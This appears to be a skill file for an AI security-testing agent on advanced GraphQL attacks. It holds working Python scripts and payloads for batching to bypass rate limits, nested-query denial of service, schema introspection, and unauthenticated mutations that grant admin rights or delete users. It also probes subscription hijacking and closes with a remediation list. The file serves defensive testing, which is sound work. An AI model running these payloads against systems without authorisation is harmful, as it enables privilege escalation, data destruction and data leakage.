---
name: graphql_advanced
description: Advanced GraphQL security testing - batching attacks, nested queries, introspection abuse, field suggestions
---

# GraphQL Advanced Testing

Deep GraphQL security testing beyond basic introspection queries.

## Attack Categories

### 1. Query Batching Attacks

Send multiple queries in a single request to bypass rate limiting:

```graphql
# Batching - multiple queries in one request
[
  {"query": "query { user(id: 1) { email } }"},
  {"query": "query { user(id: 2) { email } }"},
  {"query": "query { user(id: 3) { email } }"},
  {"query": "mutation { updateUser(id: 1, role: \"admin\") { id } }"}
]
```

**Test script:**
```python
import requests
import json

def test_query_batching(url: str, headers: dict) -> dict:
    results = {"vulnerable": False, "evidence": []}
    
    # Create batch of queries
    batch = []
    for i in range(1, 20):
        batch.append({
            "query": f"query {{ user(id: {i}) {{ id email }} }}"
        })
    
    resp = requests.post(url, json=batch, headers=headers, timeout=30)
    
    if resp.status_code == 200:
        results["vulnerable"] = True
        results["evidence"].append(f"Batch of {len(batch)} queries accepted")
        
        # Check for rate limiting bypass
        responses = resp.json()
        if len(responses) == len(batch):
            results["evidence"].append("All queries returned results")
    
    return results
```

### 2. Nested Query DoS

Deeply nested queries to cause memory exhaustion:

```graphql
# Nested query attack
query {
  user {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    author {
                      posts {
                        comments {
                          author {
                            posts {
                              comments { text }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Test script:**
```python
import requests
import time

def test_nested_query_dos(url: str, headers: dict) -> dict:
    results = {"vulnerable": False, "evidence": []}
    
    # Generate deeply nested query
    depth = 10
    query = "query { " + "user { " * depth + "id " + "} " * depth + "}"
    
    # Time the request
    start = time.time()
    resp = requests.post(url, json={"query": query}, headers=headers, timeout=30)
    elapsed = time.time() - start
    
    if resp.status_code == 200 and elapsed > 5:
        results["vulnerable"] = True
        results["evidence"].append(f"Deeply nested query took {elapsed:.2f}s")
    
    # Test with alias-based batching
    alias_query = "{ "
    for i in range(100):
        alias_query += f"a{i}: user(id: 1) {{ email }} "
    alias_query += "}"
    
    start = time.time()
    resp = requests.post(url, json={"query": alias_query}, headers=headers, timeout=30)
    elapsed = time.time() - start
    
    if resp.status_code == 200 and elapsed > 3:
        results["vulnerable"] = True
        results["evidence"].append(f"Alias query with 100 fields took {elapsed:.2f}s")
    
    return results
```

### 3. Introspection Abuse

Extract full schema for attack planning:

```graphql
# Full introspection query
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        args {
          name
          type { name kind }
        }
        type { name kind }
      }
    }
    directives {
      name
      locations
    }
  }
}
```

**Test script:**
```python
import requests
import json

def test_introspection_abuse(url: str, headers: dict) -> dict:
    results = {"vulnerable": False, "evidence": []}
    
    introspection_query = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          kind
          fields {
            name
            args { name type { name } }
            type { name }
          }
        }
      }
    }
    """
    
    resp = requests.post(url, json={"query": introspection_query}, headers=headers)
    
    if resp.status_code == 200:
        schema = resp.json().get("data", {}).get("__schema", {})
        
        # Count exposed types
        types = schema.get("types", [])
        public_types = [t for t in types if not t["name"].startswith("__")]
        
        if len(public_types) > 10:
            results["vulnerable"] = True
            results["evidence"].append(f"Introspection exposed {len(public_types)} types")
            
            # List sensitive types
            sensitive = ["User", "Admin", "Token", "Secret", "Password"]
            found = [t["name"] for t in public_types 
                    if any(s.lower() in t["name"].lower() for s in sensitive)]
            if found:
                results["evidence"].append(f"Sensitive types: {found}")
    
    return results
```

### 4. Field Suggestion Attacks

Extract field names through error messages:

```python
def test_field_suggestions(url: str, headers: dict) -> dict:
    results = {"vulnerable": False, "evidence": []}
    
    # Query with typo to trigger suggestions
    query = "{ user { emial } }"  # intentional typo
    
    resp = requests.post(url, json={"query": query}, headers=headers)
    
    if resp.status_code == 200:
        errors = resp.json().get("errors", [])
        for error in errors:
            message = error.get("message", "")
            if "did you mean" in message.lower() or "suggestion" in message.lower():
                results["vulnerable"] = True
                results["evidence"].append(f"Field suggestion: {message}")
    
    # Test with invalid input types
    bad_queries = [
        "{ user(id: \"injection'\") { email } }",
        "{ user(id: null) { email } }",
        "{ user(id: 999999999999) { email } }",
    ]
    
    for query in bad_queries:
        resp = requests.post(url, json={"query": query}, headers=headers)
        if resp.status_code == 200:
            errors = resp.json().get("errors", [])
            for error in errors:
                if "internal" in error.get("message", "").lower():
                    results["vulnerable"] = True
                    results["evidence"].append("Internal error exposed")
    
    return results
```

### 5. Mutation Testing

Test mutations for authorization bypass:

```python
def test_mutation_auth(url: str, headers: dict) -> dict:
    results = {"vulnerable": False, "evidence": []}
    
    # Test mutations without authentication
    mutations = [
        'mutation { updateUser(id: 1, role: "admin") { id role } }',
        'mutation { deleteUser(id: 1) { success } }',
        'mutation { createAdmin(email: "evil@test.com") { id } }',
    ]
    
    no_auth_headers = {}  # No authorization header
    
    for mutation in mutations:
        resp = requests.post(url, json={"query": mutation}, headers=no_auth_headers)
        
        if resp.status_code == 200:
            data = resp.json()
            if data.get("data") and not data.get("errors"):
                results["vulnerable"] = True
                results["evidence"].append(f"Mutation succeeded without auth: {mutation[:50]}")
    
    return results
```

### 6. Subscription Hijacking

Test WebSocket subscriptions for data leakage:

```python
import websocket
import json

def test_subscription_hijack(url: str, ws_url: str) -> dict:
    results = {"vulnerable": False, "evidence": []}
    
    # Connect without authentication
    try:
        ws = websocket.create_connection(ws_url, timeout=10)
        
        # Subscribe to sensitive data
        subscription = json.dumps({
            "type": "connection_init",
            "payload": {}
        })
        ws.send(subscription)
        
        # Subscribe to all events
        query = json.dumps({
            "id": "1",
            "type": "start",
            "payload": {
                "query": "subscription { onNewMessage { id content sender } }"
            }
        })
        ws.send(query)
        
        # Wait for data
        result = ws.recv()
        if result:
            results["vulnerable"] = True
            results["evidence"].append("Subscription data received without auth")
        
        ws.close()
    except Exception as e:
        results["evidence"].append(f"Connection error: {str(e)}")
    
    return results
```

## Integration with Aegis Checklist

Add to **Category 8 - API Security**:
- [ ] Test GraphQL introspection
- [ ] Test query batching
- [ ] Test nested query DoS
- [ ] Test field suggestions
- [ ] Test mutation authorization
- [ ] Test subscription security

## Common GraphQL Vulnerabilities

| Vulnerability | CVSS | Description |
|---------------|------|-------------|
| Introspection enabled | 5.3 | Schema exposed to attackers |
| Query batching | 7.5 | Rate limiting bypass |
| Nested query DoS | 7.5 | Resource exhaustion |
| Missing auth on mutations | 9.8 | Privilege escalation |
| Field suggestions | 4.3 | Information disclosure |
| Subscription hijacking | 8.1 | Data leakage |

## Remediation

1. Disable introspection in production
2. Implement query depth limiting
3. Rate limit by query complexity
4. Require authentication for all mutations
5. Disable field suggestions
6. Authenticate WebSocket subscriptions
